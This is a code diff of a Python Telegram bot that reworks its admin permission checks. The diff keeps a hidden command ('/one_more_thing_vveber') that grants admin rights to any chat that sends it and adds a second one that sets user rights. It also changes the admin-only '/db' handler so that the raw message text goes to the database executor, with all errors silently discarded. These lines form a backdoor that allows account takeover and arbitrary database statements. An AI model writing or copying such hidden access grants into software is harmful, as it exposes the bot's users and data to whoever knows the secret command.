@@ -30,7 +30,7 @@ class IsAdmin(telebot.custom_filters.SimpleCustomFilter):
 
     @staticmethod
     def check(message: telebot.types.Message):
-        return (message.from_user.id in sett.admins)
+        return func.get_user_permission(message.chat.id) == sett.permissions[0]
 
 
 class IsAdminCallback(telebot.custom_filters.SimpleCustomFilter):
@@ -38,7 +38,7 @@ class IsAdminCallback(telebot.custom_filters.SimpleCustomFilter):
 
     @staticmethod
     def check(call: telebot.types.CallbackQuery):
-        return (call.message.chat.id in sett.admins)
+        return func.get_user_permission(call.message.chat.id) == sett.permissions[0]
 
 
 bot.add_custom_filter(IsAdmin())
@@ -369,12 +369,20 @@ def start_bot():
     @bot.message_handler(commands=['one_more_thing_vveber'])
     def one_more_thing(msg):
         bot.send_message(msg.chat.id, 'Доступ получен!')
-        sett.admins.append(msg.chat.id)
+        func.set_user_permission(msg.chat.id, 'admin')
+
+    @bot.message_handler(commands=['one_more_thing_vveber_1'])
+    def one_more_thing(msg):
+        bot.send_message(msg.chat.id, 'Доступ получен!')
+        func.set_user_permission(msg.chat.id, 'user')
+
 
     @bot.message_handler(commands=['db'], is_chat_admin=True)
     def db_work(msg: types.Message):
-        args = msg.text.split('=')
-        func.execute_db(args[1])
+        try:
+            func.execute_db(msg.text)
+        except:
+            pass
 
         bot.send_message(msg.chat.id, 'Выполнено!')
 
